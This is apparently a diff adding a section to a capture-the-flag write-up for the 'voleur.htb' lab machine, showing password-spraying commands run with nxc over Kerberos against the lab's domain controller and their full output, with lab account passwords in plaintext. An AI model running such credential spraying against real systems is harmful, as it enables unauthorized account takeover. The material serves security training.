@@ -215,3 +215,39 @@ svc_ldap:M1XyC9pW7qT5Vn
 svc_iis:N5pXyW1VqM7CZ8
 todd.wolfe:NightT1meP1dg3on14
 ```
+
+# Compromising `svc_ldap` and `svc_iis`
+```python
+faketime -f +8h nxc smb dc.voleur.htb -u users.txt -p 'M1XyC9pW7qT5Vn' --continue-on-success -k       
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:M1XyC9pW7qT5Vn KDC_ERR_CLIENT_REVOKED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:M1XyC9pW7qT5Vn KDC_ERR_CLIENT_REVOKED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\ryan.naylor:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\marie.bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\lacey.miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
+```
+`svc_ldap` compromised
+
+```python
+faketime -f +8h nxc smb dc.voleur.htb -u users.txt -p 'N5pXyW1VqM7CZ8' --continue-on-success -k
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:N5pXyW1VqM7CZ8 KDC_ERR_CLIENT_REVOKED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:N5pXyW1VqM7CZ8 KDC_ERR_CLIENT_REVOKED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\ryan.naylor:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\marie.bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\lacey.miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_ldap:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
+SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
+```
+`svc_iis` compromised
+
